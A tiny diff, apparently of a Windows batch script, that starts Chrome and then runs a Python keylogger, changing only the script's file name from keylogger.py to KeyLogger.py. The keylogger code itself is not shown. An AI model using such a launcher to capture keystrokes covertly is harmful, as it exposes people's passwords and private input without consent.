@@ -2,5 +2,5 @@
 start chrome.exe
 
 cd  %CD%
-python keylogger.py
+python KeyLogger.py
 
